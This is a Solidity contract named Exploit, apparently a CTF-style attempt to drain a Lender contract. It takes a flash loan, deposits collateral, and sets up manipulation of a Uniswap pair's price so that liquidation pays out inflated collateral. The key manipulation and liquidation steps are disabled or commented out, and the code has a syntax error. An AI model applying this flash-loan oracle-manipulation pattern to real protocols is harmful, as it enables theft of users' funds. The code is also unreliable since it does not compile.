// SPDX-License-Identifier: private

pragma solidity 0.8.0;

import "./Setup.sol";

contract Exploit {
    // for exploiting I will need all existing references:
    // setup, lender, token, flashloan and uniswap stuff
    // token pair in US
    // AMM model of k = a * b
    IUniswapV2Pair public pair;
    // a reference to the lender
    Lender public lender;
    // the 2 specific tokens involved
    Token public token;
    WETH9 public weth;
    // definition of 2 tokens involved in the LP according to ERC20 interface
    ERC20Like public tokenToken;
    ERC20Like public tokenWeth;
    // flash loan provider
    FlashLoan public flashloanPool;
    // a reference to setup contract
    Setup public setup;

    // we initialize all previous variables in the constructor
    // based on our development environment data
    constructor(Setup _setup) payable {
        require(msg.value==50 ether);
        // 1 extract from existing Setup contract all available data to be in sync
        setup = _setup;
        weth = setup.weth();
        //factory = setup.factory();
        token = setup.token();
        pair = setup.pair();
        lender = setup.lender();
        flashloanPool = setup.flashloanPool();
        // also get the ERC20 'versions' of the tokens
        tokenToken = ERC20Like(address(token));
        tokenWeth = ERC20Like(address(weth));
        // finally approve transfers in our behalf
        uint256 maxAmount = type(uint256).max;
        weth.approve(address(lender), maxAmount);
        token.approve(address(lender), maxAmount);
        
        // aprove the lender
        weth.approve(address(lender), maxAmount);
        // now request a flash loan an borrow some third party weth
        // after requesting flashloan 1000 weth will be transfered to this exploit balance
        // and callback method receiveFlashLoan(uint256) will be executed
        // ** receiveFlashLoan is called **/
         // deposit some weth as msg.sender
        weth.deposit{value:50 ether}();
    }

    event Info(string key, uint256 value);

    function requestLoan() public {
        emit Info("loan-request", 1000 ether);
        // now request a flash loan an borrow some third party weth
        flashloanPool.flashLoan(1000 ether); // max 1000 ETH
    }

    /**
    receiveFlashLoan is called each time a flashloan is received
     */
    function receiveFlashLoan(uint256 amount) public {
        // at this point I already have WETH balance in my account (in the context of this tx)
        // now we need to start doing some market price manipulation
        // the goal is simple: try to call lender's liquidate method having big 'amount' value and small 'rate()' value
        // so that uint256 collateralValueRepaid = amount / rate(); is as big as possible and then is transfer to us
        // weth.transfer(msg.sender, collateralValueRepaid);

        emit Info("fl", amount); // 1000 ETH
        address victim = address(setup);

        // now we have: our weth + loan eth
        uint256 collateral = 50 ether;
        lender.deposit(collateral /*amount * 20 / 100*/); // 20%
        // initially is: deposited[user] * rate() * 2 / 3;
        // 50 * 20000 * 2 / 3 = 666666
        lender.safeDebt(msg.sender);
        emit Info("safedebt", lender.safeDebt(msg.sender));
        // now borrow some tokens
        // the first time, the relation between deposit and borrow must follow
        // the formula
        // deposited * 20000 * 2 /3 >= borrow_amount
        lender.borrow(250_000 ether);
        (uint256 t0, uint256 t1) = pair.getReserves(); // 25, 500_000
        emit Info("rate", lender.rate()); // 20_000
        emit Info("reserve0", t0);
        emit Info("reserve1", t1));
        if(false){
            // now that we have some collateral set, we need to increase the price
            uint256 tokensToTransfer = token.balanceOf(msg.sender);
            require(tokensToTransfer > 0, "no tokens to transfer");
            token.approve(address(pair), tokensToTransfer);
            token.transferFrom(msg.sender, address(pair), tokensToTransfer);

            // transfer weth to the pair
            uint256 wethToTransfer = weth.balanceOf(msg.sender);
            require(wethToTransfer > 0, "no weth to transfer");
            weth.approve(address(pair), wethToTransfer);
            weth.transferFrom(msg.sender, address(pair), wethToTransfer);
            
            // now we swap it to force a rate change
            //swap(1 ether);

            // now we liquidate setup user's debt in the lender with modified rate
            // and get weth
            //lender.liquidate(address(setup), 25 ether);
        }

        // finally return the flash loan
        weth.transfer(address(flashloanPool), amount);
    }

    function swap(uint256 input) internal {
        // function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
        pair.swap(input, 0, msg.sender, msg.data);
    }
}
